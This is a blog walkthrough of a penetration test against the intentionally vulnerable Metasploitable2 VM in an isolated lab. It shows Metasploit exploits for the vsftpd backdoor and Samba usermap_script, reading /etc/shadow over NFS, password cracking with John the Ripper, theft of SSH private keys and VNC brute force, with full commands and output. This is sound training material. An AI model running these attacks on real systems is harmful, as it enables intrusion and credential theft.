---
author: Nishchal Kush
published: '2015-02-08T19:08:00+10:00'
slug: 2015-02-08-metasploitable2-walk-through
tags:
- tutorial
- virtualbox
- metasploitable
- back door
- metasploitable 2
- hack
- compromise
- penetration testing
- exploit
- msfconsole
- meterpreter
- metasploit
- metasploitable2
- pentest
- netcat
- nmap
- kali
- hacking
title: Metasploitable2 Walk-through
---
*(This is an interim post and will be updated progressively. This note
will be removed once done.)*  
  
This post extends the walk-though on the initial version of
Metasploitable at
http://nkush.blogspot.com.au/2011/09/metasploitable-walkthrough.html. It
should be noted that some commands and output may have been truncated
for the purposes of brevity.  
  
<span style="font-size: large;">Set-up</span>  
The set-up included two machines in a virtual test environment using
VirtualBox. The first was a Metasploitable virtual machine (VM) and the
second a Kali 1.0 VM. The two hosts were configured to have a host-only
network connection. The test environment was isolated to the
192.168.32.0/24 network. All commands were execute on the Kali VM.  
  
<span style="font-size: large;">Penetration Test</span>  
**Reconnaissance**  
This was easy we know that we're using a Metasploitable image, and that
it was setup in a test environment as described in the Set-up section.
We still needed to identify the exact internet protocol (IP) address the
Metasploitable host was using.  
  

    root@kali:~# nmap -sn -n -T5 192.168.32.0/24

    Starting Nmap 6.25 ( http://nmap.org ) at 2015-02-04 03:40 EST
    Nmap scan report for 192.168.32.101
    Host is up.
    Nmap scan report for 192.168.32.102
    Host is up (0.00044s latency).
    MAC Address: 08:00:27:D1:AA:CE (Cadmus Computer Systems)
    Nmap scan report for 192.168.32.254
    Host is up (0.00041s latency).
    MAC Address: 00:00:00:00:00:00 (Cadmus Computer Systems)
    Nmap done: 256 IP addresses (3 hosts up) scanned in 8.62 seconds

  
Since know the IP address of the Kali VM, and the 192.168.32.254 as the
host-only interface of the host machine, we can infer the IP of the
Metasploitable VM as being 192.168.32.102.  
  
**Scanning**  
Now that we know the IP address of the Metasploitable host, we run a
more comprehensive scan on the host  
  

    root@kali:~# nmap -n -v -A -T5 192.168.32.102

    Starting Nmap 6.25 ( http://nmap.org ) at 2015-02-04 03:44 EST
    NSE: Loaded 106 scripts for scanning.
    NSE: Script Pre-scanning.
    Initiating ARP Ping Scan at 03:44
    Scanning 192.168.32.102 [1 port]
    Completed ARP Ping Scan at 03:44, 0.00s elapsed (1 total hosts)
    Initiating SYN Stealth Scan at 03:44
    Scanning 192.168.32.102 [1000 ports]
    Discovered open port 445/tcp on 192.168.32.102
    Discovered open port 21/tcp on 192.168.32.102
    Discovered open port 3306/tcp on 192.168.32.102
    Discovered open port 111/tcp on 192.168.32.102
    Discovered open port 23/tcp on 192.168.32.102
    Discovered open port 25/tcp on 192.168.32.102
    Discovered open port 53/tcp on 192.168.32.102
    Discovered open port 22/tcp on 192.168.32.102
    Discovered open port 80/tcp on 192.168.32.102
    Discovered open port 139/tcp on 192.168.32.102
    Discovered open port 5900/tcp on 192.168.32.102
    Discovered open port 5432/tcp on 192.168.32.102
    Discovered open port 6667/tcp on 192.168.32.102
    Discovered open port 513/tcp on 192.168.32.102
    Discovered open port 6000/tcp on 192.168.32.102
    Discovered open port 512/tcp on 192.168.32.102
    Discovered open port 1524/tcp on 192.168.32.102
    Discovered open port 8180/tcp on 192.168.32.102
    Discovered open port 514/tcp on 192.168.32.102
    Discovered open port 2121/tcp on 192.168.32.102
    Discovered open port 1099/tcp on 192.168.32.102
    Discovered open port 8009/tcp on 192.168.32.102
    Discovered open port 2049/tcp on 192.168.32.102
    Completed SYN Stealth Scan at 03:44, 0.23s elapsed (1000 total ports)
    Initiating Service scan at 03:44
    Scanning 23 services on 192.168.32.102
    Completed Service scan at 03:46, 131.18s elapsed (23 services on 1 host)
    Initiating OS detection (try #1) against 192.168.32.102
    NSE: Script scanning 192.168.32.102.
    Initiating NSE at 03:46
    Stats: 0:02:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE: Active NSE Script Threads: 2 (2 waiting)
    NSE Timing: About 96.55% done; ETC: 03:46 (0:00:01 remaining)
    Completed NSE at 03:46, 32.45s elapsed
    Nmap scan report for 192.168.32.102
    Host is up (0.00058s latency).
    Not shown: 977 closed ports
    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         vsftpd 2.3.4
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
    | ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
    |_2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
    23/tcp   open  telnet      Linux telnetd
    25/tcp   open  smtp        Postfix smtpd
    |_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
    | ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
    | Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
    | Public Key type: rsa
    | Public Key bits: 1024
    | Not valid before: 2010-03-17T14:07:45+00:00
    | Not valid after:  2010-04-16T14:07:45+00:00
    | MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
    |_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
    |_ssl-date: 2014-12-16T08:50:13+00:00; -49d8h56m14s from local time.
    53/tcp   open  domain      ISC BIND 9.4.2
    | dns-nsid: 
    |_  bind.version: 9.4.2
    80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
    |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
    |_http-title: Metasploitable2 - Linux
    111/tcp  open  rpcbind     2 (RPC #100000)
    | rpcinfo: 
    |   program version   port/proto  service
    |   100000  2            111/tcp  rpcbind
    |   100000  2            111/udp  rpcbind
    |   100003  2,3,4       2049/tcp  nfs
    |   100003  2,3,4       2049/udp  nfs
    |   100005  1,2,3      42200/tcp  mountd
    |   100005  1,2,3      56519/udp  mountd
    |   100021  1,3,4      35219/tcp  nlockmgr
    |   100021  1,3,4      46904/udp  nlockmgr
    |   100024  1          35601/tcp  status
    |_  100024  1          39332/udp  status
    139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
    512/tcp  open  exec        netkit-rsh rexecd
    513/tcp  open  login?
    514/tcp  open  shell?
    1099/tcp open  java-rmi    Java RMI Registry
    1524/tcp open  ingreslock?
    2049/tcp open  nfs         2-4 (RPC #100003)
    2121/tcp open  ftp         ProFTPD 1.3.1
    3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
    | mysql-info: Protocol: 10
    | Version: 5.0.51a-3ubuntu5
    | Thread ID: 8
    | Some Capabilities: Connect with DB, Compress, SSL, Transactions, Secure Connection
    | Status: Autocommit
    |_Salt: Fo|BtB*Jv4@#-WOe1b{e
    5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
    5900/tcp open  vnc         VNC (protocol 3.3)
    | vnc-info: 
    |   Protocol version: 3.3
    |   Security types:
    |_    Unknown security type (33554432)
    6000/tcp open  X11         (access denied)
    6667/tcp open  irc         Unreal ircd
    | irc-info: Server: irc.Metasploitable.LAN
    | Version: Unreal3.2.8.1. irc.Metasploitable.LAN 
    | Lservers/Lusers: 0/1
    | Uptime: 0 days, 0:08:19
    | Source host: ED0E3CD5.37AF7B9E.FFFA6D49.IP
    |_Source ident: OK nmap
    8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
    |_http-favicon: Apache Tomcat
    |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
    |_http-title: Apache Tomcat/5.5
    2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
    ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

    ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

    MAC Address: 08:00:27:D1:AA:CE (Cadmus Computer Systems)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.9 - 2.6.33
    Uptime guess: 0.003 days (since Wed Feb  4 03:43:12 2015)
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=200 (Good luck!)
    IP ID Sequence Generation: All zeros
    Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    | nbstat: 
    |   NetBIOS name: METASPLOITABLE, NetBIOS user: , NetBIOS MAC: 
    |   Names
    |     METASPLOITABLE<00>   Flags: 
    |     METASPLOITABLE<03>   Flags: 
    |     METASPLOITABLE<20>   Flags: 
    |     \x01\x02__MSBROWSE__\x02<01>  Flags: 
    |     WORKGROUP<00>        Flags: 
    |     WORKGROUP<1d>        Flags: 
    |_    WORKGROUP<1e>        Flags: 
    | smb-os-discovery: 
    |   OS: Unix (Samba 3.0.20-Debian)
    |   NetBIOS computer name: 
    |   Workgroup: WORKGROUP
    |_  System time: 2014-12-16T03:50:13-05:00

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.58 ms 192.168.32.102

    NSE: Script Post-scanning.
    Initiating NSE at 03:46
    Completed NSE at 03:46, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 167.17 seconds
               Raw packets sent: 1020 (45.626KB) | Rcvd: 1018 (41.561KB

  
**Gaining Access**  
From the scan we see a variety of open ports. Next we go through the
ports and attempt to identify vulnerabilities in the services and if
possible exploit them to gain access to the host. The exploits were
launched from the Kali VM using the msfconsole.  
  
*<span class="underline">Port 21 - File Transfer Protocol
(FTP)</span>*  

    Port 21 is open and appears to be running vsftpd daemon. We identified the vsftpd_234_backdoor vulnerability an attempted to exploit it. The exploit was successful and resulted in root shell access on the Metasploitable VM.

    msf > use exploit/unix/ftp/vsftpd_234_backdoor
    msf  exploit(vsftpd_234_backdoor) > set RHOST 192.168.32.102
    msf  exploit(vsftpd_234_backdoor) > exploit

    [*] Banner: 220 (vsFTPd 2.3.4)
    [*] USER: 331 Please specify the password.
    [+] Backdoor service has been spawned, handling...
    [+] UID: uid=0(root) gid=0(root)
    [*] Found shell.
    [*] Command shell session 1 opened (192.168.32.101:44513 -> 192.168.32.102:6200) at 2015-02-04 04:04:44 +1000
    id       
    uid=0(root) gid=0(root)

  
*<span class="underline">Port 2049 - Network File System (NFS)</span>*  

    2049/tcp open  nfs         2-4 (RPC #100003)

Port 2049 is used by NFS. NFS requires remote procedure calls (RPCs)
between the client and server. On contemporary systems the RPC
functionality is provided by rpcbind instead of portmap. In this
instance rpcbind is running on port 111.  

    111/tcp  open  rpcbind     2 (RPC #100000)
    | rpcinfo: 
    |   program version   port/proto  service
    |   100000  2            111/tcp  rpcbind
    |   100000  2            111/udp  rpcbind
    |   100003  2,3,4       2049/tcp  nfs
    |   100003  2,3,4       2049/udp  nfs
    |   100005  1,2,3      42200/tcp  mountd
    |   100005  1,2,3      56519/udp  mountd
    |   100021  1,3,4      35219/tcp  nlockmgr
    |   100021  1,3,4      46904/udp  nlockmgr
    |   100024  1          35601/tcp  status
    |_  100024  1          39332/udp  status

  
We first need to identify which shares are exported by the NFS server.
We use the showmount command to accomplish this  
  

    root@kali:~# showmount -e 192.168.32.102
    Export list for 192.168.32.102:
    / *

  
This illustrated that the root (/) is shared to all hosts (\*), so we
attempt to mount the NFS export to /tmp/metasploitable and see if we can
read the /etc/passwd file  
  

    root@kali:~# mkdir /tmp/metasploitable2
    root@kali:~# mount -t nfs -o nolock 192.168.32.102:/ /tmp/metasploitable2/
    root@kali:~# cat /tmp/metasploitable2/etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    dhcp:x:101:102::/nonexistent:/bin/false
    syslog:x:102:103::/home/syslog:/bin/false
    klog:x:103:104::/home/klog:/bin/false
    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
    bind:x:105:113::/var/cache/bind:/bin/false
    postfix:x:106:115::/var/spool/postfix:/bin/false
    ftp:x:107:65534::/home/ftp:/bin/false
    postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
    tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
    distccd:x:111:65534::/:/bin/false
    user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
    service:x:1002:1002:,,,:/home/service:/bin/bash
    telnetd:x:112:120::/nonexistent:/bin/false
    proftpd:x:113:65534::/var/run/proftpd:/bin/false
    statd:x:114:65534::/var/lib/nfs:/bin/false
    snmp:x:115:65534::/var/lib/snmp:/bin/false

  
So we can read the /etc/passwd file. We compile a list of users that we
can use in future bruteforce attempts.  

    cat /tmp/metasploitable/etc/passwd | awk -F: '{print $1}' > ~/users.txt

  
However, more important we also have access to the /etc/shadow file. We
can now use the /etc/passwd and /etc/shadow files with John the Ripper
to attempt to crack some passwords. We initially use the usernames as
the wordlist  

    root@kali:~# cp /tmp/metasploitable2/etc/passwd ~/passwd
    root@kali:~# cp /tmp/metasploitable2/etc/shadow ~/shadow
    root@kali:~# unshadow ~/passwd ~/shadow > ~/crack.db
    root@kali:~# john -wordlist:users.txt crack.db
    root@kali:~# john --show crack.db 
    msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
    postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
    service:service:1002:1002:,,,:/home/service:/bin/bash

  
The output above is truncated, but we see that we got 4 out of 7
passwords. Since we weren't able to crack all the passwords, needed to
try more wordlists. Being lazy I copied the wordlists from metasploit
and wfuzz into a single directory called wordlists in the root users
home directory (/root) and wrote a bash script to iterate through the
wordlists and continue running John the Ripper. The script accepts two
argument, the first is the unshadowed file, and the second is the path
to the directory containing the wordlists. Here's a copy of the script
called johno.sh  

    #!/bin/bash

    # check if root
    ID=`id -u`
    if [ "$ID" != "0" ]; then
      echo "You must be root!"
      exit 1
    fi

    # check unshadowed argument supplied
    if [ $# -ne 2 ]; then
      echo "./johno.sh  "
      echo " the unshadowed file using john the ripper."
      echo " directory containing only wordlist."
      exit 1
    fi

    # check unshadowed argument type
    if [ ! -f $1 ]; then
      echo "You must supply the unshadowed file"
      exit 1
    fi

    # check wordlists path type
    if [ ! -d $2 ]; then
      echo "You must supply the directory containing wordlists"
      exit 1
    fi

    JOHN=/usr/sbin/john

    for WORDLIST in $2/*; do
      $JOHN --wordlist:$WORDLIST $1
    done

    exit 0

We run the script and check the results  

    root@kali:~# ./johno.sh ~/crack.db ~/wordlists/

    root@kali:~# john --show crack.db 
    sys:batman:3:3:sys:/dev:/bin/sh
    klog:123456789:103:104::/home/klog:/bin/false
    msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
    postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
    service:service:1002:1002:,,,:/home/service:/bin/bash

    6 password hashes cracked, 1 left
    root@kali:~#

  
Now we can separate the username and passwords into separate lists and
use them in metasploit to simplify our bruteforce attacks. As we have
free reign over the file system we can also navigate into the user's
home directories and investigate the files and directories. After
checking that /etc/sudoers and /etc/groups files we note that msfadmin
is able to perform sudo functions. Thus in the msfadmin's .ssh directory
we find the user@metasploitable has an authorised\_key entry, further
examination of the /root .ssh directory reveals that msfadmin is
authorised. We are thus able to obtain the user@metasploitable and
msfadmin@metasploitable private keys  

    root@kali:~# cat /tmp/metasploitable/home/msfadmin/.ssh/authorized_keys 
    ssh-dss AAAAB3NzaC1kc3MAAACBANWgcbHvxF2YRX0gTizyoZazzHiU5+63hKFOhzJch8dZQpFU5gGkDkZ30rC4jrNqCXNDN50RA4ylcNtO78B/I4+5YCZ39faSiXIoLfi8tOVWtTtg3lkuv3eSV0zuSGeqZPHMtep6iizQA5yoClkCyj8swXH+cPBG5uRPiXYL911rAAAAFQDL+pKrLy6vy9HCywXWZ/jcPpPHEQAAAIAgt+cN3fDT1RRCYz/VmqfUsqW4jtZ06kvx3L82T2Z1YVeXe7929JWeu9d3OB+NeE8EopMiWaTZT0WI+OkzxSAGyuTskue4nvGCfxnDr58xa1pZcSO66R5jCSARMHU6WBWId3MYzsJNZqTN4uoRa4tIFwM8X99K0UUVmLvNbPByEAAAAIBNfKRDwM/QnEpdRTTsRBh9rALq6eDbLNbu/5gozf4Fv1Dt1Zmq5ZxtXeQtW5BYyorILRZ5/Y4pChRa01bxTRSJah0RJk5wxAUPZ282N07fzcJyVlBojMvPlbAplpSiecCuLGX7G04Ie8SFzT+wCketP9Vrw0PvtUZU3DfrVTCytg== user@metasploitable
    root@kali:~# ls -l /tmp/metasploitable/home/user/.ssh/
    total 8
    -rw------- 1 1001 1001 668 May  8  2010 id_dsa
    -rw-r--r-- 1 1001 1001 609 May  8  2010 id_dsa.pub
    root@kali:~# cat /tmp/metasploitable/root/.ssh/authorized_keys 
    ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
    root@kali:~# ls -l /tmp/metasploitable2/home/msfadmin/.ssh/
    total 12
    -rw-r--r-- 1 1000 1000  609 May  8  2010 authorized_keys
    -rw------- 1 1000 1000 1675 May 18  2010 id_rsa
    -rw-r--r-- 1 1000 1000  405 May 18  2010 id_rsa.pub
    root@kali:~# cp /tmp/metasploitable2/home/msfadmin/.ssh/id_rsa ~/msfadmin_private_key
    root@kali:~# ssh -i ~/msfadmin_private_key root@192.168.32.102
    Last login: Tue Dec 16 05:43:41 2014 from 192.168.32.101
    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.

    To access official Ubuntu documentation, please visit:
    http://help.ubuntu.com/
    You have new mail.
    root@metasploitable:~# id
    uid=0(root) gid=0(root) groups=0(root)

  
We could have also generated our own SSH key pair and added the public
keys to the authorized\_keys file for the users, including the root
user.  
  
*<span class="underline">Port 513 - rlogin</span>*  
Port 513 appears to be running rlogin which allows users to login to the
Metasploitable VM over the network. Since we already know the password
for the msfadmin user and know that msfadmin is a member of the admin
group, which allows use of sudo, we can login as msfadmin and get root
access  
  

    root@kali:~# rlogin -l msfadmin 192.168.32.102
    msfadmin@192.168.32.102's password: 
    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.

    To access official Ubuntu documentation, please visit:
    http://help.ubuntu.com/
    No mail.
    Last login: Tue Dec 16 05:34:15 2014 from 192.168.32.101
    msfadmin@metasploitable:~$ id
    uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
    msfadmin@metasploitable:~$ sudo -i
    root@metasploitable:~# 
    root@metasploitable:~# id
    uid=0(root) gid=0(root) groups=0(root)
    root@metasploitable:~# 

  
*<span class="underline">Port 512 - rexec</span>*  
Port 512 appears to be running a remote execution daemon which allows
remote execution of command. We attempt connection using netcat to
confirm  

    root@kali:~# nc -vv 192.168.32.102 512
    192.168.32.102: inverse host lookup failed: Unknown server error : Connection timed out
    (UNKNOWN) [192.168.32.102] 512 (exec) open
     Where are you?
     sent 0, rcvd 15
    root@kali:~# 
    root@kali:~# 
    root@kali:~# nc -vvn 192.168.32.102 512
    (UNKNOWN) [192.168.32.102] 512 (exec) open
     Where are you?
     sent 0, rcvd 16

  
The Where are you? indicates that the Metasploitable VM is unable to
determine the hostname of the Kali VM. Since we have access via SSH, and
NFS, we can modify the /etc/hosts file to add "192.168.32.101 kali", and
attempt the connection again  

    root@kali:~# nc -vvnt 192.168.32.102 512
    (UNKNOWN) [192.168.32.102] 512 (exec) open

<span style="color: red;">I need to come back to this one</span>  
  
*<span class="underline">Port 514 - rsh</span>*  
Port 514 appears to be running rsh. Again we already know some cracked
passwords and can log in directly  

    root@kali:~# rsh msfadmin@192.168.32.102
    msfadmin@192.168.32.102's password: 
    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.

    To access official Ubuntu documentation, please visit:
    http://help.ubuntu.com/
    No mail.
    Last login: Tue Dec 16 17:54:05 2014 from 192.168.32.101
    msfadmin@metasploitable:~$

  
*<span class="underline">Port 139 - Samba</span>*  
Samba needs ports 137-139 and 445 for NetBIOS and Active Directory
functionality.  

    msf > use exploit/multi/samba/usermap_script 
    msf  exploit(usermap_script) > show options

    Module options (exploit/multi/samba/usermap_script):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       RHOST                   yes       The target address
       RPORT  139              yes       The target port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic



    msf  exploit(usermap_script) > set RHOST 192.168.32.102
    RHOST => 192.168.32.102
    msf  exploit(usermap_script) > show options

    Module options (exploit/multi/samba/usermap_script):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       RHOST  192.168.32.102   yes       The target address
       RPORT  139              yes       The target port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic


    msf  exploit(usermap_script) > exploit

    [*] Started reverse double handler
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo hmZ5eNWZPLnkQNsR;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket B
    [*] B: "hmZ5eNWZPLnkQNsR\r\n"
    [*] Matching...
    [*] A is input...
    [*] Command shell session 1 opened (192.168.32.101:4444 -> 192.168.32.102:58167) at 2015-02-04 07:16:13 +1000

    id
    uid=0(root) gid=0(root)

  
*<span class="underline">Port 3306 - MySQL</span>*  
Port 3306 appears to be open and used by a MySQL daemon. We attempt to
enumerate the users using metasploit. Initial exploit fails, but once we
specify the username root, it succeeds. The exploit also demonstrates
that a root password is not set, and connection to the database as root
is possible, i.e. mysql -h 192.168.32.102 -p -u root. The truth is we
just got lucky with this exploit.  

    msf > use auxiliary/admin/mysql/mysql_enum 
    msf  auxiliary(mysql_enum) > info

           Name: MySQL Enumeration Module
         Module: auxiliary/admin/mysql/mysql_enum
        Version: 0
        License: Metasploit Framework License (BSD)
           Rank: Normal

    Provided by:
      Carlos Perez 

    Basic options:
      Name      Current Setting  Required  Description
      ----      ---------------  --------  -----------
      PASSWORD                   no        The password for the specified username
      RHOST                      yes       The target address
      RPORT     3306             yes       The target port
      USERNAME                   no        The username to authenticate as

    Description:
      This module allows for simple enumeration of MySQL Database Server 
      provided proper credentials to connect remotely.

    References:
      https://cisecurity.org/benchmarks.html

    msf  auxiliary(mysql_enum) > set RHOST 192.168.32.102
    RHOST => 192.168.32.102
    msf  auxiliary(mysql_enum) > run

    [-] Access denied
    [*] Auxiliary module execution completed
    msf  auxiliary(mysql_enum) > set USERNAME root
    USERNAME => root
    msf  auxiliary(mysql_enum) > run

    [*] Running MySQL Enumerator...
    [*] Enumerating Parameters
    [*]  MySQL Version: 5.0.51a-3ubuntu5
    [*]  Compiled for the following OS: debian-linux-gnu
    [*]  Architecture: i486
    [*]  Server Hostname: metasploitable
    [*]  Data Directory: /var/lib/mysql/
    [*]  Logging of queries and logins: OFF
    [*]  Old Password Hashing Algorithm OFF
    [*]  Loading of local files: ON
    [*]  Logins with old Pre-4.1 Passwords: OFF
    [*]  Allow Use of symlinks for Database Files: YES
    [*]  Allow Table Merge: YES
    [*]  SSL Connections: Enabled
    [*]  SSL CA Certificate: /etc/mysql/cacert.pem
    [*]  SSL Key: /etc/mysql/server-key.pem
    [*]  SSL Certificate: /etc/mysql/server-cert.pem
    [*] Enumerating Accounts:
    [*]  List of Accounts with Password Hashes:
    [*]   User: debian-sys-maint Host:  Password Hash: 
    [*]   User: root Host: % Password Hash: 
    [*]   User: guest Host: % Password Hash: 
    [*]  The following users have GRANT Privilege:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following users have CREATE USER Privilege:
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following users have RELOAD Privilege:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following users have SHUTDOWN Privilege:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following users have SUPER Privilege:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following users have FILE Privilege:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following users have PROCESS Privilege:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following accounts have privileges to the mysql database:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following accounts have empty passwords:
    [*]   User: debian-sys-maint Host: 
    [*]   User: root Host: %
    [*]   User: guest Host: %
    [*]  The following accounts are not restricted by source:
    [*]   User: guest Host: %
    [*]   User: root Host: %
    [*] Auxiliary module execution completed
    msf  auxiliary(mysql_enum) > 

  
*<span class="underline">Port 5900 - VNC</span>*  
Warning: This expoit took a long time, since the VNC server was setup to
lock out the host after a number of failed login attempts.  
The Metasploitable VM appears to be running VNC. We used the metasploit
module for vnc\_login to attempt brute force. This method was not very
efficient, as the VNC server would reject connection attempts after a
number of failed attempts even with the brute force speed turned down to
0. I finally got the password when I used the wordlist
/usr/share/metasploit-framework/data/wordlists/vnc\_passwords.txt (which
only contained a single "password")  

    msf > use auxiliary/scanner/vnc/vnc_login
    msf  auxiliary(vnc_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt
    PASS_FILE => /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt
    msf  auxiliary(vnc_login) > run

    [*] 192.168.32.102:5900 - Starting VNC login sweep
    [*] 192.168.32.102:5900 VNC - [1/2] - Attempting VNC login with password ''
    [*] 192.168.32.102:5900 VNC - [1/2] - , VNC server protocol version : 3.3
    [-] 192.168.32.102:5900 VNC - [1/2] - , Authentication failed
    [*] 192.168.32.102:5900 VNC - [2/2] - Attempting VNC login with password 'password'
    [*] 192.168.32.102:5900 VNC - [2/2] - , VNC server protocol version : 3.3
    [+] 192.168.32.102:5900, VNC server password : "password"
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf  auxiliary(vnc_login) > 

  
With the VNC password, we can use vncviewer to connect to the server to
get a root shell  

    root@kali:~# vncviewer 192.168.32.102
    Connected to RFB server, using protocol version 3.3
    Performing standard VNC authentication
    Password: 
    Authentication successful
    Desktop name "root's X desktop (metasploitable:0)"
    VNC server default format:
      32 bits per pixel.
      Least significant byte first in each pixel.
      True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
    Using default colormap which is TrueColor.  Pixel format:
      32 bits per pixel.
      Least significant byte first in each pixel.
